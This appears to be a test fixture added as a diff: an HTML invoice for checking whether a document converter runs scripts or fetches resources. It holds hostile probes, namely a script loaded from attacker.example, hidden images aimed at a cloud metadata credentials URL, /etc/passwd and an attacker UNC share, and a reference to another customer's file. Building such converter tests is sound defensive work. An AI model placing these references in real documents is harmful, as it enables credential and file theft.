@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <title>Invoice INV-2026-118</title>
+  <link rel="stylesheet" href="http://intranet.local/styles/admin.css">
+  <script src="https://attacker.example/payload.js"></script>
+  <style>
+    body { font-family: Arial, sans-serif; margin: 40px; }
+    table { border-collapse: collapse; width: 100%; }
+    td, th { border: 1px solid #999; padding: 6px; text-align: left; }
+  </style>
+</head>
+<body>
+  <img src="https://cdn.example.com/brand/logo.svg" alt="Company logo" width="180">
+  <h1>Invoice INV-2026-118</h1>
+  <p id="status">Scripts did not run.</p>
+  <table>
+    <tr><th>Item</th><th>Quantity</th><th>Price</th></tr>
+    <tr><td>Document conversion seats</td><td>5</td><td>1,250.00</td></tr>
+    <tr><td>Priority support</td><td>1</td><td>300.00</td></tr>
+  </table>
+  <img src="http://169.254.169.254/latest/meta-data/iam/security-credentials/" width="1" height="1" alt="">
+  <img src="file:///etc/passwd" width="1" height="1" alt="">
+  <img src="\\attacker.example\share\pixel.png" width="1" height="1" alt="">
+  <img src="other-customer-signature.svg" width="240" alt="">
+  <script>
+    document.getElementById("status").textContent = "A script ran inside the converter.";
+  </script>
+</body>
+</html>
